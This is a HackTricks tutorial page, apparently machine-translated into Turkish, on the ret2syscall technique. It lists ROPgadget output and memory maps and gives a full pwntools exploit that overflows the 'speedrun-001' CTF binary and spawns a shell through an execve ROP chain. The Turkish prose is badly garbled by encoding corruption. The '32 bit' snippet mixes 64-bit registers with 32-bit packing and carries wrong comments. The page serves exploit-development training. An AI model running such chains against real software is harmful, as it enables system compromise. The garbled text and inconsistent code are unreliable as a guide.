# Ret2syscall

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## Temel Bilgiler

Bu, Ret2lib'e benzer, ancak bu durumda bir kÃ¼tÃ¼phaneden bir fonksiyon Ã§aÄŸÄ±rmayacaÄŸÄ±z. Bu durumda, her ÅŸey `/bin/sh`'yi Ã§alÄ±ÅŸtÄ±rmak iÃ§in bazÄ± argÃ¼manlarla `sys_execve` sistem Ã§aÄŸrÄ±sÄ±nÄ± Ã§aÄŸÄ±rmak Ã¼zere hazÄ±rlanacaktÄ±r. Bu teknik genellikle statik olarak derlenmiÅŸ ikili dosyalarda gerÃ§ekleÅŸtirilir, bu nedenle birÃ§ok gadget ve sistem Ã§aÄŸrÄ±sÄ± talimatÄ± olabilir.

**syscall** Ã§aÄŸrÄ±sÄ±nÄ± hazÄ±rlamak iÃ§in aÅŸaÄŸÄ±daki yapÄ±landÄ±rma gereklidir:

* `rax: 59 sys_execve'yi belirtir`
* `rdi: "/bin/sh" dosyasÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in iÅŸaretÃ§i`
* `rsi: 0 argÃ¼man geÃ§ilmediÄŸini belirtir`
* `rdx: 0 ortam deÄŸiÅŸkeni geÃ§ilmediÄŸini belirtir`

Yani, temelde `/bin/sh` dizesini bir yere yazmak ve ardÄ±ndan `syscall`'Ä± gerÃ§ekleÅŸtirmek gerekiyor (stack'i kontrol etmek iÃ§in gereken padding'in farkÄ±nda olarak). Bunun iÃ§in, `/bin/sh`'yi bilinen bir alana yazmak iÃ§in bir gadget'a ihtiyacÄ±mÄ±z var.

{% hint style="success" %}
Ã‡aÄŸrÄ±lacak baÅŸka ilginÃ§ bir sistem Ã§aÄŸrÄ±sÄ± **`mprotect`**'dir; bu, bir saldÄ±rganÄ±n **bellekteki bir sayfanÄ±n izinlerini deÄŸiÅŸtirmesine** olanak tanÄ±r. Bu, [**ret2shellcode**](../../stack-overflow/stack-shellcode/) ile birleÅŸtirilebilir.
{% endhint %}

## KayÄ±t gadget'larÄ±

**Bu kayÄ±tlarÄ± nasÄ±l kontrol edeceÄŸimizi** bulmaya baÅŸlayalÄ±m:
```bash
ROPgadget --binary speedrun-001 | grep -E "pop (rdi|rsi|rdx\rax) ; ret"
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x00000000004101f3 : pop rsi ; ret
0x00000000004498b5 : pop rdx ; ret
```
Bu adreslerle **stack'teki iÃ§eriÄŸi yazmak ve bunu register'lara yÃ¼klemek** mÃ¼mkÃ¼ndÃ¼r.

## Dize yaz

### YazÄ±labilir bellek

Ã–ncelikle bellek iÃ§inde yazÄ±labilir bir yer bulmanÄ±z gerekiyor.
```bash
gef> vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
```
### BelleÄŸe Dize Yazma

Sonra, bu adrese rastgele iÃ§erik yazmanÄ±n bir yolunu bulmanÄ±z gerekiyor.
```python
ROPgadget --binary speedrun-001 | grep " : mov qword ptr \["
mov qword ptr [rax], rdx ; ret #Write in the rax address the content of rdx
```
### ROP zincirini otomatikleÅŸtir

AÅŸaÄŸÄ±daki komut, yazma-nerede-ne yazÄ±lacaÄŸÄ± aletleri ve syscall talimatlarÄ± olduÄŸunda, statik bir ikili dosya verildiÄŸinde tam bir `sys_execve` ROP zinciri oluÅŸturur:
```bash
ROPgadget --binary vuln --ropchain
```
#### 32 bit
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''

rop += popRdx           # place value into EAX
rop += "/bin"           # 4 bytes at a time
rop += popRax           # place value into edx
rop += p32(0x6b6000)    # Writable memory
rop += writeGadget   #Address to: mov qword ptr [rax], rdx

rop += popRdx
rop += "//sh"
rop += popRax
rop += p32(0x6b6000 + 4)
rop += writeGadget
```
#### 64 bit
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000) # Writable memory
rop += writeGadget #Address to: mov qword ptr [rax], rdx
```
## Gadget EksikliÄŸi

EÄŸer **gadget eksikliÄŸiniz** varsa, Ã¶rneÄŸin `/bin/sh`'yi belleÄŸe yazmak iÃ§in, yÄ±ÄŸÄ±n Ã¼zerinden tÃ¼m kayÄ±t deÄŸerlerini (RIP ve parametre kayÄ±tlarÄ± dahil) kontrol etmek iÃ§in **SROP tekniÄŸini** kullanabilirsiniz:

{% content-ref url="../srop-sigreturn-oriented-programming/" %}
[srop-sigreturn-oriented-programming](../srop-sigreturn-oriented-programming/)
{% endcontent-ref %}

## SÃ¶mÃ¼rÃ¼ Ã–rneÄŸi
```python
from pwn import *

target = process('./speedrun-001')
#gdb.attach(target, gdbscript = 'b *0x400bad')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Our syscall gadget
syscall = p64(0x40129c)

'''
Here is the assembly equivalent for these blocks
write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

'''
Prep the four registers with their arguments, and make the syscall

pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
'''

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += p64(0x6b6000)

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall


# Add the padding to the saved return address
payload = "0"*0x408 + rop

# Send the payload, drop to an interactive shell to use our new shell
target.sendline(payload)

target.interactive()
```
## DiÄŸer Ã–rnekler ve Referanslar

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html)
* 64 bit, PIE yok, nx, bazÄ± bellek alanÄ±na `execve` Ã§aÄŸÄ±rmak iÃ§in bir ROP yazÄ±n ve oraya atlayÄ±n.
* [https://guyinatuxedo.github.io/07-bof\_static/bkp16\_simplecalc/index.html](https://guyinatuxedo.github.io/07-bof\_static/bkp16\_simplecalc/index.html)
* 64 bit, nx, PIE yok, bazÄ± bellek alanÄ±na `execve` Ã§aÄŸÄ±rmak iÃ§in bir ROP yazÄ±n ve oraya atlayÄ±n. YÄ±ÄŸÄ±n Ã¼zerinde yazmak iÃ§in matematiksel iÅŸlemler gerÃ§ekleÅŸtiren bir fonksiyon istismar edilmektedir.
* [https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html)
* 64 bit, PIE yok, nx, BF canary, bazÄ± bellek alanÄ±na `execve` Ã§aÄŸÄ±rmak iÃ§in bir ROP yazÄ±n ve oraya atlayÄ±n.

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
